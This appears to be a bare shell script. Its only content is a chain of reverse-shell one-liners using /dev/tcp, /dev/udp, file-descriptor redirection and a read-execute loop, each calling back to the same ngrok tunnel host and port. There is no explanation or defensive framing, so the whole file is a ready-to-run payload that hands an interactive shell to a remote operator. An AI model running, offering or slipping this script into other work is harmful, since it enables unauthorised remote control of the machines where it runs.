#!/bin/sh

sh -i >& /dev/tcp/0.tcp.sa.ngrok.io/14241 0>&1 | 0<&196;exec 196<>/dev/tcp/0.tcp.sa.ngrok.io/14241; sh <&196 >&196 2>&196 | exec 5<>/dev/tcp/0.tcp.sa.ngrok.io/14241;cat <&5 | while read line; do $line 2>&5 >&5; done | sh -i 5<> /dev/tcp/0.tcp.sa.ngrok.io/14241 0<&5 1>&5 2>&5 | sh -i >& /dev/udp/0.tcp.sa.ngrok.io/14241 0>&1